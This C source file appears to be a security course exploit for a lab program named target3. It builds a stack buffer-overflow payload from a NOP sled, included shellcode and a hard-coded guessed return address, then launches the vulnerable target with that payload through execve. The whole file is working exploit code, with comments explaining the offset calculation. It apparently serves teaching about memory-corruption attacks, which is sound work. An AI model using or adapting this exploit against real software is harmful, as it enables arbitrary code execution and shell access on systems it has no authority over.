#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define BUFSIZE 73 //68 from &rip = 0x3021fe98, (&buf = 0x3021fe50 + 0x4 "AAAA") = 0x3021fe54  + 4(target_ra) + 1('\0')
#define SHELLSIZE 45 // strlen(shellcode)=45

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	//making overflow buffer
	char buff[BUFSIZE];

	//fill in the beginning of the buff with NOP
	for(int i=0;i<BUFSIZE-SHELLSIZE-4-1;i++)
	{
		buff[i] = '\x90'; //fill with NOP=0x90
	}

	//put shellcode before return address
	for(int i=0;i<SHELLSIZE;i++)
	{
		buff[BUFSIZE-SHELLSIZE-4-1+i] = shellcode[i];
	}

	//put guessed return address before null terminator
	char target_ra[] = "\x54\xfe\x21\x30";//little-endian 0x3021fe54
	for(int i=0;i<4;i++)
	{
		buff[BUFSIZE-5+i] = target_ra[i];
	}

	//put null terminator at the end of buffer
	buff[BUFSIZE-1] = '\0';

	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}